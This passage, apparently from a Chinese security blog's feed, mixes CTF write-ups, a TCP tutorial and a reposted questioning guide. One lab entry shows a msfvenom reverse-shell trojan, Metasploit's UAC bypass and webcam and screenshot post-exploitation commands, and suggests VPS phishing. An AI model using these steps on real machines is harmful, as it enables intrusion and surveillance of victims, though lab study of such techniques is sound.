title="boom（crypto）"></a>boom（crypto）</h2><blockquote><p>全场最简单的一道题，完全是送分</p></blockquote><p>一个程序，首先是MD5解密，在线找就行</p><p>然后解一个三元一次方程组，懒人是不会自己解方程的，z3库终于用上了。</p><pre><code class="python">from z3 import *s=Solver()a1=[0]*3for i in range(3):    a1[i]=Int(&#39;a1[&#39;+str(i)+&#39;]&#39;)s.add(3*a1[0]-a1[1]+a1[2]==185)s.add(2*a1[0]+3*a1[1]-a1[2]==321) s.add(a1[0]+a1[1]+a1[2]==173)s.check()print(s.model())</code></pre><p>最后解一元二次方程，求根公式就可以</p><p>flag格式不了解（这个是我脑残了，拿cmd运行就可以了），用ida看了下格式</p><p>flag{en5oy_746831_89127561}</p>]]></content>
    
    
    <categories>
      
      <category>CTF比赛wp</category>
      
    </categories>
    
    
    <tags>
      
      <tag>信息安全</tag>
      
      <tag>Re</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>buuctf密码学入门</title>
    <link href="/2020/04/30/202004301334/"/>
    <url>/2020/04/30/202004301334/</url>
    
    <content type="html"><![CDATA[<blockquote><p>有大佬给我推荐了buuctf平台，去平台玩一玩，记录一些有意思的。</p></blockquote><h2 id="rabbit"><a href="#rabbit" class="headerlink" title="rabbit"></a>rabbit</h2><p><a href="https://files.buuoj.cn/files/3aebe57d15403d745e63e964e670e3e5/bfdb217e-b914-4314-9a1b-a26a286475a3.zip?token=eyJ1c2VyX2lkIjo2Mzk5LCJ0ZWFtX2lkIjpudWxsLCJmaWxlX2lkIjoxMzZ9.XqaHDA.0qXtLx8neFbE4rbMkS110Pw88NU" target="_blank" rel="noopener">题目地址</a></p><p>一种叫做rabbit的流密码，本题在线解密即可。</p><h2 id="密码学的心声"><a href="#密码学的心声" class="headerlink" title="密码学的心声"></a>密码学的心声</h2><p><a href="https://files.buuoj.cn/files/e4f12b8c336823c121a7a70f5c481025/93ffdda9-7931-4753-aee3-0c05df7bc9b5.bmp?token=eyJ1c2VyX2lkIjo2Mzk5LCJ0ZWFtX2lkIjpudWxsLCJmaWxlX2lkIjoxODN9.XqaRrw.ddujMakK1LDJ1nlaoGDiH92KGoE" target="_blank" rel="noopener">题目地址</a></p><p>看到了一个曲谱,由于所有数字都小于8，考虑八进制组合，3个一组，得出flag</p><h2 id="佛说：只能四天"><a href="#佛说：只能四天" class="headerlink" title="佛说：只能四天"></a>佛说：只能四天</h2><p><a href="https://files.buuoj.cn/files/96f4e049df1e4a9bffcea9820c8acda3/attachment.zip?token=eyJ1c2VyX2lkIjo2Mzk5LCJ0ZWFtX2lkIjpudWxsLCJmaWxlX2lkIjoxNzg4fQ.XqpBOg.JupE0Zueil2C15oyys2785iERtw" target="_blank" rel="noopener">题目地址</a></p><p>根据题目描述，首先判断出是新与佛论禅</p><p>得出一堆富强民主文明和谐，猜测是核心价值观加密</p><p>得到一串字母和doyouknowfence</p><p>栅栏密码，推到4时发现doyouknowcaesar</p><p>凯撒的本意是移位3，所以得出一串字母</p><p>字母由大写的26个字母和2-7组成，很可能是base32</p><p>得出flag</p><h2 id="2018CISCN-oldstreaming"><a href="#2018CISCN-oldstreaming" class="headerlink" title="2018CISCN oldstreaming"></a>2018CISCN oldstreaming</h2><p><a href="https://files.buuoj.cn/files/36826b80bcc36bb17715b68057117573/attachment.bz2?token=eyJ1c2VyX2lkIjo2Mzk5LCJ0ZWFtX2lkIjpudWxsLCJmaWxlX2lkIjoxMzA0fQ.XqgDxw.95ktAz9823n5DqnCDE-4Ap6D3Ak" target="_blank" rel="noopener">题目地址</a></p><p>LFSR线性移位反馈寄存器，具体知识参考ctf wiki相关章节</p><p>2^32的范围，按常理来说爆破可行，但我们选择一个更有意义的解法，比特分析：</p><p>根据输出的前31位，可以确定key的最低位，然后递推即可。</p><pre><code>flag{926201d7}</code></pre><h2 id="坏蛋是雷宾"><a href="#坏蛋是雷宾" class="headerlink" title="坏蛋是雷宾"></a>坏蛋是雷宾</h2><p>rabin算法基础题，了解rabin原理，爆破得出结果。</p><pre><code class="python">n=523798549c=162853095for i in range(0,523798549):    if pow(i,2)%n==c:        print i# 115739001# 214318436# 309480113# 408059548</code></pre><p>爆破得出四个结果，转换二进制后六位是否为110001，确认309480113符合条件，移除后六位后即为明文。</p>]]></content>
    
    
    <categories>
      
      <category>CTF题目复现</category>
      
    </categories>
    
    
    <tags>
      
      <tag>信息安全</tag>
      
      <tag>crypto</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>安恒4月月赛部分题解</title>
    <link href="/2020/04/26/anheng-2020-4/"/>
    <url>/2020/04/26/anheng-2020-4/</url>
    
    <content type="html"><![CDATA[<blockquote><p>本次安恒月赛，作者完成了三道题，主项的两个re全部完成，其他题目MISC提交一道，crypto尝试一道没能完成。（因为作者个人事务，本次月赛作者只玩了一个小时，如果之后有补充的逆向题，那只能感到很遗憾）</p></blockquote><blockquote><p>果然比赛结束前两小时又放了一道逆向题，不过我在赛后也用不到两个小时的时间完成了这个re，现在把这个re也加进来。</p></blockquote><h2 id="REVERSE"><a href="#REVERSE" class="headerlink" title="REVERSE"></a>REVERSE</h2><blockquote><p>本次月赛的逆向题比较简单，没用多长时间就完成了两个逆向题。</p></blockquote><h3 id="入门reverse"><a href="#入门reverse" class="headerlink" title="入门reverse"></a>入门reverse</h3><p>ida静态分析，明显的对字符串-1并异或6即可得出flag</p><h3 id="简单的加密3"><a href="#简单的加密3" class="headerlink" title="简单的加密3"></a>简单的加密3</h3><p>刚开始看的时候有点没反应过来，看到要求输入长度&gt;=9的时候发现了输入的数字会覆盖掉部分变量，那么想到如果不覆盖变量就可以得到flag，同时，发现每个字符的异或是相同的，因此我们可以猜测或者爆破这个数字：</p><p>当然了，像我这么懒的肯定是先猜一猜，考虑到flag或DAS开头，因此我猜测了这个数字：64^38=’f’,因此这个数字是64：</p><p>很幸运，我猜对了，下面是脚本：</p><pre><code class="python">a=[38,44,33,39,59,35,34,115,117,114,113,33,36,117,118,119,35,120,38,114,117,113,38,34,113,114,117,114,36,112,115,118,121,112,35,37,121,61]str=&quot;&quot;for i in a:    str=str+chr(64^i)    print(str)# flag{cb3521ad567c8f251fb1252d03690ce9}</code></pre><h3 id="sm"><a href="#sm" class="headerlink" title="sm"></a>sm</h3><p>一道加密题，这道题显示了我crypto之前两个月白学了，看到sm只知道是加密，不知道是什么样式的。静态分析，看到32位的key，把key查了一下，发现很可能是sm4加密，加密函数的构造也证实了这种可能。</p><p>sm4解密有个python库十分好用，在此推荐一波：[<a href="https://github.com/yang3yen/pysm4]" target="_blank" rel="noopener">https://github.com/yang3yen/pysm4]</a></p><p>所以脚本如下：</p><pre><code class="python">from pysm4 import encrypt,decryptmk=0x0123456789abcdeffedcba9876543210cipher=0xc079776677e5ac9931c567eb470645a7print(hex(decrypt(cipher,mk)))a=[0xd0389046,0xc236e4c6,0x6bd78795,0x9f5c6e66]for i in a:    print(i)#flag{d0389046c236e4c66bd787959f5c6e66}</code></pre><h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><blockquote><p>然后看了一会其他项目的题，感受一下自己的无知，然后发现自己还是能做出签到题的</p></blockquote><h3 id="MISC：6G还远吗"><a href="#MISC：6G还远吗" class="headerlink" title="MISC：6G还远吗"></a>MISC：6G还远吗</h3><p>下载一个文件，下载速度非常慢，但是不重要，打开没完成下载的文件就能看到flag。</p>]]></content>
    
    
    <categories>
      
      <category>CTF比赛wp</category>
      
    </categories>
    
    
    <tags>
      
      <tag>信息安全</tag>
      
      <tag>Re</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>简单了解TCP协议</title>
    <link href="/2020/04/14/TCP/"/>
    <url>/2020/04/14/TCP/</url>
    
    <content type="html"><![CDATA[<h2 id="一个故事"><a href="#一个故事" class="headerlink" title="一个故事"></a>一个故事</h2><blockquote><p>这是从“码农翻身”公众号上转载的一个故事，这个故事很形象的展示了TCP/IP协议的运作。</p></blockquote><p>我们先看一个故事来简单了解一下TCP协议大致是什么样的。（此故事转载自TCP/IP 之大明王朝邮差及大明内阁，有修改）</p><p>大明天启年间，宦官当政，民不聊生，国家处于崩溃边缘（所有朝代gg的时候似乎都是这样的），官道早已荒废，往来的奏报、物资经常被强盗劫走，朝廷兵力不足，对此无可奈何。</p><p>首辅叶大人不想坐以待毙，研究建立了一套运输方案：在各地设置节点，各节点之间可以连接形成线路，需要运送物资时便在道路上布置士兵把守，运送结束后再撤掉士兵。</p><p>现在，我们短暂穿越回现代，按照现代人的知识储备，我们知道，这就是虚电路。</p><p><a href="https://imgchr.com/i/Gx7aOU" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2020/04/14/Gx7aOU.png" srcset="/img/loading.gif" alt="Gx7aOU.png"></a></p><p>回到大明王朝，“虚电路”运行了半年，整体效果很好，但也存在通道不发送信件就会闲置浪费的问题。大太监魏忠贤得知此事，以浪费国家资源为由命令官员们停止，运输计划只能暂时搁置。</p><p>这时，又有官员提出了一套新的方案，不用军队在官道站岗，不用建立安全的连接通道，完全依靠马匹、骡子这样的牲畜进行通信，这些马是训练过的，身上带着信件或者物资， 可以在官道上走，每到一个驿站或者市镇，里边的衙役看看信件的目的地，喂喂马，然后把马引到下一个官道就可以了， 很省事。 当然具体到那个官道是衙役决定的， 他会搜集各种消息，确定哪个官道匪患少、虎狼少。（穿越回现代，我们了解到这就是路由表构建及转发数据分组）</p><p>当然，这套方案仍有问题，大家可能也看出来了，这个方案不能保证运输物资的顺利到达。于是，有人提出将包裹分成小块运输，如果有没有传过去的物资就重新发送（此时的大明拥有神器幻月宝镜， 丢了的东西可以从中再取出来）。同时，不需要事先建立真正的连接通道， 每个编号小块走的路可能也不一样， 完全由中间节点的衙役们来决定马匹的下一个路径是哪一个。（这就是分组交换）</p><img src="https://s1.ax1x.com/2020/04/14/GxHd3t.png" srcset="/img/loading.gif" alt="GxHd3t.png" border="0" /><p>想必此时的你还有一个疑惑，我们如何判断选择的路径是否通畅呢？面对这个问题，有官员解释道，我们可以先发三封信：<br>第一封：京城发信，县衙收到了，此时县衙就会明白：京城发信能力和自己的收信能力是没问题的<br>第二封：县衙发信，京城收到了，此时京城就会明白：京城的发信和收信都是好的， 县衙的发信和收信也都是没问题的。<br>第三封：京城发信，县衙收到了，此时京城已经确认，双发的收信，发信都是没问题的，　这次回应的目的只是消除县衙对自己的发信功能和京城的收信功能的担忧而已。（这就是TCP线路创建时三次握手的原理）</p><p>当传输完成时，也通过互发信件的过程终止传输，不过终止需要四封信件，即需要双方均向对方发送信件请求停止，并双方均回信完成确认，这就是结束时四次挥手</p><p>通过这样的线路，大明王朝拥有了一套高效稳定的运输方案，摇摇欲坠王朝也得到短暂的喘息。穿越回现代的我们，在领略了这套传输过程之后，应该也对TCP协议有了初步的认识。下面，让我们更细致的学习TCP协议的原理。</p><h2 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h2><p>维基百科上对于TCP协议的定义为：传输控制协议（英语：Transmission Control Protocol，缩写：TCP）是一种面向连接的、可靠的、基于字节流的传输层通信协议，由IETF的RFC 793定义。在简化的计算机网络OSI模型中，它完成第四层传输层所指定的功能。</p><p>简单地说，互联网由一整套协议构成，TCP作为其中的一层，有自己的分工。而TCP 协议的作用是，保证数据通信的完整性和可靠性，防止丢包。<br><img src="https://s1.ax1x.com/2020/04/14/GxbSbD.png" srcset="/img/loading.gif" alt="GxbSbD.png" border="0" /></p><h2 id="运作模式"><a href="#运作模式" class="headerlink" title="运作模式"></a>运作模式</h2><h3 id="创建通路"><a href="#创建通路" class="headerlink" title="创建通路"></a>创建通路</h3><p>TCP通过三次握手创建一个连接，在连接创建过程中，很多参数要被初始化，例如序号被初始化以保证按序传输和连接的强壮性。</p><p>通常情况下，一端先打开一个套接字监听另一方连接，这一端称为服务端，服务端打开后，客户端开始创建主动打开：<br>（1）客户端通过向服务器端发送一个SYN来创建一个主动打开，作为三次握手的一部分。客户端把这段连接的序号设定为随机数A。<br>（2）服务器端应当为一个合法的SYN回送一个SYN/ACK。ACK的确认码应为A+1，SYN/ACK包本身又有一个随机产生的序号B。<br>（3）最后，客户端再发送一个ACK。此时包的序号被设定为A+1，而ACK的确认码则为B+1。当服务端收到这个ACK的时候，就完成了三次握手，并进入了连接创建状态。</p><p>是不是觉得这个过程和故事中的发三封信相同？这就是三次握手的实际运作形式。</p><img src="https://s1.ax1x.com/2020/04/14/GxbqeS.png" srcset="/img/loading.gif" alt="GxbqeS.png" border="0" /><h3 id="数据传输"><a href="#数据传输" class="headerlink" title="数据传输"></a>数据传输</h3><p>首先介绍一下数据包的概念：</p><p>以太网数据包（packet）的大小是固定的，最初是1518字节，后来增加到1522字节。其中， 1500 字节是负载（payload），22字节是头信息（head）。<br><a href="https://imgchr.com/i/GxqVY9" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2020/04/14/GxqVY9.md.png" srcset="/img/loading.gif" alt="GxqVY9.png" border="0" /></a><br>以太网数据包之下是IP数据包，IP数据包也有自己的头信息，具体的会在接下来的IP协议章节中说明。</p><p>IP数据包之下才是TCP数据包，TCP数据包也有自己的头信息，因此实际应用层往往仅有1400字节左右，如果传输的数据量更大，则需要分包传输<br><a href="https://imgchr.com/i/Gxqwm8" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2020/04/14/Gxqwm8.md.png" srcset="/img/loading.gif" alt="Gxqwm8.png" border="0" /></a></p><p>接下来让我们来研究发送过程：</p><p>首先，发送的时候，TCP 协议为每个包编号（sequence number，简称 SEQ），以便接收的一方按照顺序还原。万一发生丢包，也可以知道丢失的是哪一个包。</p><p>第一个包的编号是一个随机数。为了便于理解，这里就把它称为1号包。假定这个包的负载长度是100字节，那么可以推算出下一个包的编号应该是101。这就是说，每个数据包都可以得到两个编号：自身的编号，以及下一个包的编号。接收方由此知道，应该按照什么顺序将它们还原成原始文件</p><p>发送完成后，操作系统会按顺序完成组装，传输完成。</p><h3 id="终结通路"><a href="#终结通路" class="headerlink" title="终结通路"></a>终结通路</h3><p>连接终止使用了四路握手过程（或称四次握手，four-way handshake），在这个过程中连接的每一侧都独立地被终止。当一个端点要停止它这一侧的连接，就向对侧发送FIN，对侧回复ACK表示确认。因此，拆掉一侧的连接过程需要一对FIN和ACK，分别由两侧端点发出。下图很清晰的说明了此过程<br><a href="https://imgchr.com/i/GxqLX6" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2020/04/14/GxqLX6.png" srcset="/img/loading.gif" alt="GxqLX6.png" border="0" /></a></p><h2 id="TCP协议可靠的原因"><a href="#TCP协议可靠的原因" class="headerlink" title="TCP协议可靠的原因"></a>TCP协议可靠的原因</h2><p>下面介绍一些TCP协议可靠的原因（不全面，介绍几个有代表性的）<br>1.确认和重传机制：建立连接时三次握手同步双方的“序列号 + 确认号 + 窗口大小信息”，是确认重传、流控的基础。传输过程中，如果Checksum校验失败、丢包或延时，发送端重传。<br>2.慢启动：服务器发送数据包，当然越快越好，最好一次性全发出去。但是，发得太快，就有可能丢包。带宽小、路由器过热、缓存溢出等许多因素都会导致丢包。线路不好的话，发得越快，丢得越多。因此TCP协议设置了慢启动机制，开始的时候，发送得较慢，然后根据丢包的情况，调整速率：如果不丢包，就加快发送速度；如果丢包，就降低发送速度。<br>3.ACK检验：TCP协议规定接收方每接收两个数据包发送一个确认信息，确认信息成为ACK，ACK携带下一个数据包的编号    和接收方接收窗口的剩余容量，根据ACK和编号，可以推测接收速率，调整发送速度。<br>4.数据包遗失处理：这也和ACK有关，每一个数据包都带有下一个数据包的编号。如果下一个数据包没有收到，那么 ACK 的编号就不会发生变化，因此就会不断返回相同的ACK，当收到三个相同的ACK时，就会确认丢包，从而再次发送。</p><h2 id="IP协议（网际协议）"><a href="#IP协议（网际协议）" class="headerlink" title="IP协议（网际协议）"></a>IP协议（网际协议）</h2><p>简要介绍一下IP协议：</p><p>IP 协议定义了一套自己的地址规则，称为 IP 地址。它实现了路由功能，允许某个局域网的 A 主机，向另一个局域网的 B 主机发送消息。</p><p>也就是说：IP协议是一个地址协议，数据在互联网上的传输过程是由IP协议完成的，即上文所说的在TCP数据包前加上IP报头。IP报头中含有版本、源IP、目的IP、存活时间等信息，系统通过处理这些信息控制传输过程。</p><p>由于TCP协议负责数据管控，IP协议负责传输，是传输过程的核心部分，因此整个传输过程通常成为TCP/IP协议。</p><h2 id="UDP"><a href="#UDP" class="headerlink" title="UDP"></a>UDP</h2><p>说到TCP协议，就不得不提到UDP协议：</p><p>UDP（User Data Protocol，用户数据报协议）是一个简单的面向数据报的通信协议，提供数据的不可靠传递。</p><p>相比于TCP协议，UDP协议没有握手过程，起步快延迟小，没有重传机制，相比于TCP协议来说是“不可靠”的。</p><p>但同时UDP协议有带宽利用小，传输速度快等优势，相比TCP，UDP在网络传输中同样有着不可替代的优势。</p><p>实际工作中，往往根据需要选用不同的协议。</p>]]></content>
    
    
    
    <tags>
      
      <tag>计算机基础知识</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>windows下提权实验</title>
    <link href="/2020/03/29/dig3/"/>
    <url>/2020/03/29/dig3/</url>
    
    <content type="html"><![CDATA[<blockquote><p>在我们获取对方电脑权限后，我们应该做什么（不要总是想到删库）</p></blockquote><h2 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境"></a>实验环境</h2><p>kali linux攻击机（推荐kali20.1）</p><p>win 7 basic</p><h2 id="如何拿到权限"><a href="#如何拿到权限" class="headerlink" title="如何拿到权限"></a>如何拿到权限</h2><p>面对这样一台裸露的win7，我们有很多办法能拿到权限，比如著名的EternalBlue，这样可以直接拿到系统权限。</p><p>不过，我们还有更有意思的玩法，那就是反弹shell获取权限</p><p>首先，生成一个windows下运行的木马程序</p><pre><code class="bash">msfvenom -p windows/meterpreter/reverse_tcp lhost=[你的IP] lport=[端口] -f exe -o 要生成的文件名</code></pre><p>启动http服务</p><pre><code class="bash">python -m SimpleHTTPServer 8080</code></pre><p>然后，进入msfconsole，使用模块handler，设置payload，这一部分操作在之前提到过，所以不详细说明了。</p><p>执行攻击，显示打开了监听</p><p>然后我们在浏览器输入本机ip和设置端口，看到了文件链接</p><p>我们打开win7虚拟机，也登陆这个ip，下载并运行文件</p><p>我们看到msf显示我们获取了权限</p><p>查看自己权限等级，发现为administrator，没获取到system等级，因此我们需要提权。</p><h3 id="不正常的拓展"><a href="#不正常的拓展" class="headerlink" title="不正常的拓展"></a>不正常的拓展</h3><blockquote><p>这一部分希望大家合理实验，不要利用此技术做违法的事情，技术无罪，心存敬畏</p></blockquote><p>危险操作：大家可能也发现了，我们这套操作是让目标在我们的内网端口下载这个文件，当然，我们可以用一个VPS让这个端口可以在外网访问，然后就可以实现钓鱼，这也就是很多木马软件的运行机制，只不过木马软件会捆绑在看似正常的软件背后。</p><h2 id="提升权限"><a href="#提升权限" class="headerlink" title="提升权限"></a>提升权限</h2><h3 id="uac"><a href="#uac" class="headerlink" title="uac"></a>uac</h3><p>UAC（User Account Control，用户账户控制）是Windows 7及后续Windows系统引入的一种安全功能，启用该功能后，在用户没有显示允许的情况下，即便是本地管理员账户也无法更改操作系统。我们经常看到桌面用户使用的是管理员账户（虽然不推荐，但这种做法已司空见惯），因此即使恶意软件掌握了本地管理员账户，想修改注册表中的某些信息，或者在系统中创建一个新的服务，UAC也会及时阻止这类行为。</p><p>后来研究人员找到了绕过该机制的方法，并且从Windows 7以来已经有许多方法可以绕过UAC。这种情况非常常见，以至于微软将这类问题当成“非优先”安全问题来处理。</p><h3 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h3><p>绕过也很简单，在kali使用下面的payload即可：</p><pre><code class="bash">use exploit/windows/local/bypassuac</code></pre><p>使用此代码，即可实现无弹窗uac绕过</p><h2 id="后面的工作"><a href="#后面的工作" class="headerlink" title="后面的工作"></a>后面的工作</h2><p>自此，我们已经拿到了系统权限，对面的机器对于我们来说将可以随意攻击，在meterpreter中有非常多的后渗透攻击方法可以使用，感兴趣的可以自己去查一下，这里推荐几个有意思的</p><pre><code class="bash">Screenshot //截图webcam_stram //直播webcam_snap //开启对方摄像头shell //进入shellrun Scraper //信息收集脚本</code></pre>]]></content>
    
    
    <categories>
      
      <category>渗透攻击实战</category>
      
    </categories>
    
    
    <tags>
      
      <tag>信息安全</tag>
      
      <tag>漏洞利用</tag>
      
      <tag>kali</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Hack.lu-2017 The_Maya_Society题解</title>
    <link href="/2020/03/12/the-maya-society/"/>
    <url>/2020/03/12/the-maya-society/</url>
    
    <content type="html"><![CDATA[<blockquote><p>在逆向面前，dyn无时无刻都在感受自己的渺小。。。</p></blockquote><p>题目地址：<a href="https://adworld.xctf.org.cn/media/task/attachments/17574fc423474b93a0e6e6a6e583e003.zip" target="_blank" rel="noopener">https://adworld.xctf.org.cn/media/task/attachments/17574fc423474b93a0e6e6a6e583e003.zip</a></p><p>题目描述：无</p><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>拿到这道题之后，看到html文件和launcher程序，当时没明白html文件的作用，做完之后怀疑是下载launcher程序用的。</p><p><a href="https://imgchr.com/i/8mt3o6" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2020/03/12/8mt3o6.png" srcset="/img/loading.gif" alt="8mt3o6.png" border="0" /></a></p><h2 id="查壳"><a href="#查壳" class="headerlink" title="查壳"></a>查壳</h2><p>将程序导入peid，经查，无壳，elf文件，64bit</p><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>老规矩，用gdb-pwndbg和ida进行联合调试</p><h3 id="静态分析"><a href="#静态分析" class="headerlink" title="静态分析"></a>静态分析</h3><blockquote><p>恕在下孤陋寡闻，静态分析相比于很多大神的思路差的太远，不过还是看到了一些有用的东西</p></blockquote><p><a href="https://imgchr.com/i/8mdIu4" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2020/03/12/8mdIu4.png" srcset="/img/loading.gif" alt="8mdIu4.png" border="0" /></a></p><p>这里应该是一个md5加密，疑似是对不明格式时间字符串进行加密</p><p><a href="https://imgchr.com/i/8m0GFI" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2020/03/12/8m0GFI.png" srcset="/img/loading.gif" alt="8m0GFI.png" border="0" /></a></p><p>这一串可能是几串字符串的合并过程</p><p><a href="https://imgchr.com/i/8m040J" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2020/03/12/8m040J.png" srcset="/img/loading.gif" alt="8m040J.png" border="0" /></a></p><p>这个函数我没看懂。。。</p><p><a href="https://imgchr.com/i/8mBkjS" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2020/03/12/8mBkjS.png" srcset="/img/loading.gif" alt="8mBkjS.png" border="0" /></a></p><p>base64解密</p><p><a href="https://imgchr.com/i/8mBf8P" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2020/03/12/8mBf8P.png" srcset="/img/loading.gif" alt="8mBf8P.png" border="0" /></a></p><p>异或0x25</p><p>经过一系列静态分析和试运行，我发现了一些关键点：题目中没有输入，很可能是对时间进行加解密（这个就可以确定时间是我们需要修改的），加密过程经过了md5，字符串合成，18a4函数，b64，异或0x25得到flag</p><h3 id="动态调试"><a href="#动态调试" class="headerlink" title="动态调试"></a>动态调试</h3><p>下面我们进入动态调试，第一次先不改时间，前面都照常运行，而且我们发现合并的字符串是md5加密后的时间与”.fluxfingers.net”合成。但是进入18a4之后出现了问题，我们发现只有正确的时间才能使程序完成判断过程继续执行，显然这个时间是一定要得到的（后面加密完全是依靠时间），因此我们看一下题目：maya，html里满满的世界末日气息。。。那就猜2012-12-21，开始正式的调试。</p><p>首先在1a8C处下断点，将rax寄存器的时间串修改为2012-12-21</p><p>之后再18a4断下，发现程序能够正常执行，并得到了一串base64字符串</p><p>其实到这一步，我们已经可以脱离调试器：解码base64，异或0x25，得到flag，当然，也可以选择调试到最后</p><blockquote><p>在这里，dyn跳的有点多了，导致自己丢了（也可能是没找到）最后的flag，但是没关系，我们找到了异或0x25之前的数据，把数据导出来异或一样可以得到flag</p></blockquote><p><a href="https://imgchr.com/i/8myCVg" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2020/03/12/8myCVg.png" srcset="/img/loading.gif" alt="8myCVg.png" border="0" /></a></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>这道题脑洞是真的大，也算是让我费了很大的精力（早晚死于调试），不过能得到flag还是很高兴的。</p>]]></content>
    
    
    <categories>
      
      <category>CTF题目复现</category>
      
    </categories>
    
    
    <tags>
      
      <tag>信息安全</tag>
      
      <tag>Re</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>(转载)提问的智慧</title>
    <link href="/2020/03/10/ask/"/>
    <url>/2020/03/10/ask/</url>
    
    <content type="html"><![CDATA[<blockquote><p>转载这篇文章，警戒自己和他人</p></blockquote><h1 id="提问的智慧"><a href="#提问的智慧" class="headerlink" title="提问的智慧"></a>提问的智慧</h1><p><a href="https://github.com/ryanhanwu/How-To-Ask-Questions-The-Smart-Way/pulls" target="_blank" rel="noopener"><img src="https://img.shields.io/badge/PRs-welcome-brightgreen.svg?style=flat-square" srcset="/img/loading.gif" alt="PRs Welcome"></a></p><p><strong>How To Ask Questions The Smart Way</strong></p><p>Copyright © 2001,2006,2014 Eric S. Raymond, Rick Moen</p><p>本指南英文版版权为 Eric S. Raymond, Rick Moen 所有。</p><p>原文网址：<a href="http://www.catb.org/~esr/faqs/smart-questions.html" target="_blank" rel="noopener">http://www.catb.org/~esr/faqs/smart-questions.html</a></p><p>Copyleft 2001 by D.H.Grand(nOBODY/Ginux), 2010 by Gasolin, 2015 by Ryan Wu</p><p>本中文指南是基于原文 3.10 版以及 2010 年由 <a href="https://github.com/gasolin" target="_blank" rel="noopener">Gasolin</a> 所翻译版本的最新翻译；</p><p>协助指出翻译问题，<strong>请<a href="https://github.com/ryanhanwu/smartquestions/issues/new" target="_blank" rel="noopener">发 Issue</a>，或直接<a href="https://github.com/ryanhanwu/smartquestions/compare/" target="_blank" rel="noopener">发 Pull Request</a> 给我。</strong></p><p>本文另有<a href="https://github.com/ryanhanwu/How-To-Ask-Questions-The-Smart-Way/blob/master/README.md" target="_blank" rel="noopener">繁體中文版</a>。</p><h2 id="原文版本历史"><a href="#原文版本历史" class="headerlink" title="原文版本历史"></a><a href="https://github.com/ryanhanwu/smartquestions/blob/master/history.md" target="_blank" rel="noopener">原文版本历史</a></h2><h2 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h2><ul><li><a href="#声明">声明</a></li><li><a href="#简介">简介</a></li><li><a href="#在提问之前">在提问之前</a></li><li><a href="#当你提问时">当你提问时</a><ul><li><a href="#慎选提问的论坛">慎选提问的论坛</a></li><li><a href="#stack-overflow">Stack Overflow</a></li><li><a href="#网站和-irc-论坛">网站和 IRC 论坛</a></li><li><a href="#第二步使用项目邮件列表">第二步，使用项目邮件列表</a></li><li><a href="#使用有意义且描述明确的标题">使用有意义且描述明确的标题</a></li><li><a href="#使问题容易回复">使问题容易回复</a></li><li><a href="#用清晰正确精准并合法语法的语句">用清晰、正确、精准并合法语法的语句</a></li><li><a href="#使用易于读取且标准的文件格式发送问题">使用易于读取且标准的文件格式发送问题</a></li><li><a href="#精确地描述问题并言之有物">精确地描述问题并言之有物</a></li><li><a href="#话不在多而在精">话不在多而在精</a></li><li><a href="#别动辄声称找到-bug">别动辄声称找到 Bug</a></li><li><a href="#低声下气不能代替你的功课">低声下气不能代替你的功课</a></li><li><a href="#描述问题症状而非你的猜测">描述问题症状而非你的猜测</a></li><li><a href="#按发生时间先后列出问题症状">按发生时间先后列出问题症状</a></li><li><a href="#描述目标而不是过程">描述目标而不是过程</a></li><li><a href="#别要求使用私人电邮回复">别要求使用私人电邮回复</a></li><li><a href="#清楚明确的表达你的问题以及需求">清楚明确的表达你的问题以及需求</a></li><li><a href="#询问有关代码的问题时">询问有关代码的问题时</a></li><li><a href="#别把自己家庭作业的问题贴上来">别把自己家庭作业的问题贴上来</a></li><li><a href="#去掉无意义的提问句">去掉无意义的提问句</a></li><li><a href="#即使你很急也不要在标题写紧急">即使你很急也不要在标题写紧急</a></li><li><a href="#礼多人不怪而且有时还很有帮助">礼多人不怪，而且有时还很有帮助</a></li><li><a href="#问题解决后加个简短的补充说明">问题解决后，加个简短的补充说明</a></li></ul></li><li><a href="#如何解读答案">如何解读答案</a><ul><li><a href="#rtfm-和-stfw如何知道你已完全搞砸了">RTFM 和 STFW：如何知道你已完全搞砸了</a></li><li><a href="#如果还是搞不懂">如果还是搞不懂</a></li><li><a href="#处理无礼的回应">处理无礼的回应</a></li></ul></li><li><a href="#如何避免扮演失败者">如何避免扮演失败者</a></li><li><a href="#不该问的问题">不该问的问题</a></li><li><a href="#好问题与蠢问题">好问题与蠢问题</a></li><li><a href="#如果得不到回答">如果得不到回答</a></li><li><a href="#如何更好地回答问题">如何更好地回答问题</a></li><li><a href="#相关资源">相关资源</a></li><li><a href="#鸣谢">鸣谢</a></li></ul><h2 id="声明"><a href="#声明" class="headerlink" 